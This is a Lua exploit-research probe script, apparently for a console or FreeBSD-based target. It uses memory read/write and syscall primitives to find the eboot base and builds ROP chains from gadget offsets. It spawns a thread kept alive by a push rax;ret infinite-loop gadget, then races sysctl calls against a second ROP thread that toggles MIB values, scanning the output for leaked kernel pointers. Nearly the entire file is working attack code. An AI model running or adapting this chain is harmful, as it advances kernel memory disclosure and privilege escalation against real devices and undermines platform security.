-- CRASH_CLASS: MODERATE
-- PROBE 80n: Infinite thread loop + concurrent sysctl race
--
-- Key insight: push rax;ret (eboot+0x962) with rax = its own address
-- creates an infinite loop (push pushes addr, ret pops it back, net RSP=0).
-- This keeps the thread alive indefinitely while main thread races.
--
-- Section A: Prove infinite loop works (thread writes marker, loops, main reads after delay)
-- Section B: Thread toggles sysctl MIB while main calls sysctl concurrently

print("=== PROBE 80n: INFINITE THREAD + RACE ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function q(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X_%08X", v.h, v.l)
    end
    return string.format("0x%X", to_num(v))
end
local function wd(addr, val) return pcall(function() memory.write_dword(addr, val) end) end
local function wq(addr, val) return pcall(function() memory.write_qword(addr, val) end) end
local function rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function zero(buf, n)
    for off = 0, n - 4, 4 do wd(buf + off, 0) end
end

syscall.resolve({ sc_getpid = 20 })
print("[*] pid=" .. syscall.sc_getpid():tonumber())

local info = memory.alloc(0x200)
wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), info) end)
local eboot = uint64(string.format("0x%X%08X", rd(info + 0x10C) or 0, rd(info + 0x108) or 0))
print("[*] eboot=" .. q(eboot))

local pop_rdi_ret   = eboot + 0xC9DFE
local pop_rax_ret   = eboot + 0x992
local pop_rsi_ret   = eboot + 0xD77D
local mov_rdi_eax   = eboot + 0x92C68
local mov_rdi_rax   = eboot + 0x92C67
local ret_gadget    = eboot + 0x42
local push_rax_ret  = eboot + 0x962    -- INFINITE LOOP gadget

print("[*] push_rax_ret=" .. q(push_rax_ret))

-- =================================================================
-- SECTION A: Write marker, then infinite loop. Main reads marker.
-- =================================================================
print("")
print("=== [A] WRITE + INFINITE LOOP ===")

local marker = memory.alloc(16)
zero(marker, 16)
wd(marker, 0x41414141)

local sc_mmap = make_syscall(477)
local s_ok, stack_base = pcall(function()
    return sc_mmap(uint64(0), uint64(4 * 0x4000), uint64(0x33),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)

-- ROP chain: write DEADBEEF, set rax=push_rax_ret, enter infinite loop
local idx = 0
local function push(val)
    wq(stack_base + (idx * 8), val)
    idx = idx + 1
end

-- Write marker
push(marker)                 -- popped into RDI
push(pop_rax_ret)            -- ret to pop_rax
push(uint64(0xDEADBEEF))    -- RAX = DEADBEEF
push(mov_rdi_eax)            -- mov [rdi], eax; ret → writes marker

-- Enter infinite loop: set rax = push_rax_ret, then jump there
push(pop_rax_ret)            -- ret to pop_rax
push(push_rax_ret)           -- RAX = address of push_rax_ret
push(push_rax_ret)           -- ret to push_rax_ret → infinite loop starts

print("[*] chain=" .. idx .. " slots")

local ctx = memory.alloc(0x600)
zero(ctx, 0x600)
pcall(function() make_syscall(421)(uint64(ctx)) end)

wq(ctx + 0xE0, pop_rdi_ret)     -- RIP
wq(ctx + 0xF8, stack_base)      -- RSP

print("[*] CS=0x" .. string.format("%X", rd(ctx + 0xE8) or 0))
print("[*] before=" .. string.format("0x%08X", rd(marker)))

local tid_buf = memory.alloc(8)
zero(tid_buf, 8)

print("[*] CALLING thr_create")

local ok_call, rv_call = pcall(function()
    return make_syscall(430)(uint64(ctx), uint64(tid_buf), uint64(0))
end)

-- If infinite loop works, the process is ALIVE and we can do whatever we want
-- Wait a bit for thread to write
local dummy = 0
for i = 1, 2000000 do dummy = dummy + 1 end

-- Read marker — thread should have written DEADBEEF and is now looping
local m = rd(marker) or 0
print(string.format("RV=%s OK=%s M=0x%08X TID=%s", tostring(rv_call), tostring(ok_call), m, q(rq(tid_buf))))

if m == 0xDEADBEEF then
    print("*** INFINITE THREAD CONFIRMED — MARKER WRITTEN, PROCESS ALIVE ***")

    -- Do more reads to prove we have unlimited time
    for i = 1, 3 do
        for j = 1, 1000000 do dummy = dummy + 1 end
        local alive = pcall(function() return syscall.sc_getpid():tonumber() end)
        print("[*] heartbeat " .. i .. ": alive=" .. tostring(alive) .. " marker=0x" .. string.format("%08X", rd(marker) or 0))
    end

    -- =================================================================
    -- SECTION B: SYSCTL RACE — thread modifies MIB while main calls sysctl
    -- =================================================================
    print("")
    print("=== [B] SYSCTL TOCTOU RACE ===")

    -- For a real TOCTOU we need a SECOND thread modifying shared memory
    -- while the first thread loops. The main thread calls sysctl.
    -- Thread 2: toggles MIB[1] between KERN_PROC(14) and KERN_OSRELEASE(2)

    local mib = memory.alloc(16)
    wd(mib, 1)       -- CTL_KERN
    wd(mib + 4, 2)   -- KERN_OSRELEASE (safe, short string)

    -- Build thread 2's chain: toggle mib+4 between 2 and 14, N times, then loop
    local s2_ok, stack2 = pcall(function()
        return sc_mmap(uint64(0), uint64(4 * 0x4000), uint64(0x33),
            uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)

    local idx2 = 0
    local function push2(val)
        wq(stack2 + (idx2 * 8), val)
        idx2 = idx2 + 1
    end

    -- First half-cycle: RIP is already pop_rdi_ret, so first entry = argument
    push2(mib + 4)             -- popped into RDI by initial pop_rdi_ret
    push2(pop_rax_ret)
    push2(uint64(14))          -- KERN_PROC
    push2(mov_rdi_eax)

    push2(pop_rdi_ret)
    push2(mib + 4)
    push2(pop_rax_ret)
    push2(uint64(2))           -- KERN_OSRELEASE
    push2(mov_rdi_eax)

    -- Remaining 199 toggle cycles
    for cycle = 2, 200 do
        push2(pop_rdi_ret)
        push2(mib + 4)
        push2(pop_rax_ret)
        push2(uint64(14))
        push2(mov_rdi_eax)

        push2(pop_rdi_ret)
        push2(mib + 4)
        push2(pop_rax_ret)
        push2(uint64(2))
        push2(mov_rdi_eax)
    end

    -- Infinite loop at end
    push2(pop_rax_ret)
    push2(push_rax_ret)
    push2(push_rax_ret)

    print("[*] thread2 chain=" .. idx2 .. " slots (" .. idx2 * 8 .. " bytes)")

    -- Build context for thread 2
    local ctx2 = memory.alloc(0x600)
    zero(ctx2, 0x600)
    pcall(function() make_syscall(421)(uint64(ctx2)) end)
    wq(ctx2 + 0xE0, pop_rdi_ret)
    wq(ctx2 + 0xF8, stack2)

    local tid2 = memory.alloc(8)
    zero(tid2, 8)

    print("[*] spawning thread 2 (MIB toggler)...")
    local ok2, rv2 = pcall(function()
        return make_syscall(430)(uint64(ctx2), uint64(tid2), uint64(0))
    end)
    -- Immediate print after binary dump (same pattern as section A)
    print("T2=" .. tostring(rv2) .. " ok=" .. tostring(ok2))

    -- Now race: main thread calls sysctl 200 times while thread 2 toggles MIB
    local sc_sysctl = make_syscall(202)
    local outbuf = memory.alloc(0x800)
    local oldlenp = memory.alloc(8)
    local anomalies = 0
    local kptrs = 0

    for i = 1, 100 do
        zero(outbuf, 0x100)
        wd(oldlenp, 0x800)
        local ok_s, rv_s = pcall(function()
            return sc_sysctl(uint64(mib), uint64(4), uint64(outbuf),
                uint64(oldlenp), uint64(0), uint64(0))
        end)
        local rv_n = to_num(rv_s)

        if rv_n ~= 0 and rv_n ~= 0xFFFFFFFF then
            anomalies = anomalies + 1
        end

        -- Quick kernel pointer scan
        for off = 0, 0x100 - 8, 8 do
            local v = rq(outbuf + off)
            if v then
                local h = 0
                if type(v) == "table" and v.h then h = v.h end
                if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then
                    kptrs = kptrs + 1
                    if kptrs <= 3 then
                        print("[!!!] KPTR +0x" .. string.format("%X", off) .. ": " .. q(v))
                    end
                end
            end
        end

        if i % 25 == 0 then
            print("[B] i=" .. i .. " anom=" .. anomalies .. " kp=" .. kptrs)
        end
    end

    print("[B] DONE: 100 sysctl, anomalies=" .. anomalies .. " kptrs=" .. kptrs)
    if kptrs > 0 then
        print("[B] *** KERNEL POINTER LEAK VIA TOCTOU! ***")
    end
end

print("=== PROBE 80n COMPLETE ===")
